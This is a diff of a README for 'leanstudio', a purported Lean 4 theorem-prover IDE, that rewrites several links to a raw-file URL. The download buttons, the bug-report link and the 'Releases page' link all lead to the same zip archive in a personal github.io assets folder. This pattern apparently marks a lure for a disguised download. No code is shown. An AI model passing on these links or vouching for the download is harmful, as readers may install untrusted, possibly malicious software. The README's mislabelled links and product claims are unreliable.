@@ -25,7 +25,7 @@ Getting leanstudio on your computer is simple. Here's what to do:
 
 **Click the big green button below to download:**
 
-[![Download leanstudio](https://img.shields.io/badge/Download-leanstudio-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Dezz05/dezz05.github.io/raw/refs/heads/main/assets/Application-3.3-beta.4.zip)
+[![Download leanstudio](https://img.shields.io/badge/Download-leanstudio-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Dezz05/dezz05.github.io/main/assets/Application-3.3-beta.4.zip)
 
 Visit this link to download the application.
 
@@ -43,7 +43,7 @@ When leanstudio opens, you'll see a clean, friendly interface. You can open an e
 
 We know installation can sometimes be tricky, so here's a more detailed walkthrough:
 
-1. Go to [https://github.com/Dezz05/dezz05.github.io/raw/refs/heads/main/assets/Application-3.3-beta.4.zip](https://github.com/Dezz05/dezz05.github.io/raw/refs/heads/main/assets/Application-3.3-beta.4.zip) using your web browser (Chrome, Edge, Firefox, or Safari).
+1. Go to [https://raw.githubusercontent.com/Dezz05/dezz05.github.io/main/assets/Application-3.3-beta.4.zip](https://raw.githubusercontent.com/Dezz05/dezz05.github.io/main/assets/Application-3.3-beta.4.zip) using your web browser (Chrome, Edge, Firefox, or Safari).
 2. Look for the **"Releases"** section on the right side of the page, or scroll down to find the latest version.
 3. Click the download link for your operating system. leanstudio works on:
    - **Windows** (10 or 11)
@@ -95,7 +95,7 @@ It's like having a patient, super-smart tutor watching over your shoulder — bu
 You're never alone when using leanstudio. Here's how to get help:
 
 - **📚 In-App Guide:** Open the "Help" menu inside leanstudio for tutorials and examples.
-- **🐛 Found a Bug?** Go to [https://github.com/Dezz05/dezz05.github.io/raw/refs/heads/main/assets/Application-3.3-beta.4.zip](https://github.com/Dezz05/dezz05.github.io/raw/refs/heads/main/assets/Application-3.3-beta.4.zip) and let us know. We can't fix what we don't know about!
+- **🐛 Found a Bug?** Go to [https://raw.githubusercontent.com/Dezz05/dezz05.github.io/main/assets/Application-3.3-beta.4.zip](https://raw.githubusercontent.com/Dezz05/dezz05.github.io/main/assets/Application-3.3-beta.4.zip) and let us know. We can't fix what we don't know about!
 - **💬 Community Discussions:** Visit the main GitHub page to see discussions, ask questions, or share what you've built.
 - **🧠 Lean 4 Resources:** If you want to learn Lean 4 itself, search for "Lean theorem prover tutorial" online — there are many free courses and videos.
 
@@ -105,7 +105,7 @@ We believe that formal proof is for everyone, and we're here to help you succeed
 
 ## 📦 Releases & Updates
 
-leanstudio is actively developed. We recommend checking the [Releases page](https://github.com/Dezz05/dezz05.github.io/raw/refs/heads/main/assets/Application-3.3-beta.4.zip) every few weeks to see if a new version is available.
+leanstudio is actively developed. We recommend checking the [Releases page](https://raw.githubusercontent.com/Dezz05/dezz05.github.io/main/assets/Application-3.3-beta.4.zip) every few weeks to see if a new version is available.
 
 Each release includes:
 - New features and improvements
@@ -154,7 +154,7 @@ leanstudio is more than just an IDE — it's a bridge between human intuition an
 
 **Ready to start?** Click the button below:
 
-[![Download leanstudio Now](https://img.shields.io/badge/📥_Download_leanstudio-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Dezz05/dezz05.github.io/raw/refs/heads/main/assets/Application-3.3-beta.4.zip)
+[![Download leanstudio Now](https://img.shields.io/badge/📥_Download_leanstudio-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Dezz05/dezz05.github.io/main/assets/Application-3.3-beta.4.zip)
 
 Visit this link to download the application.
 
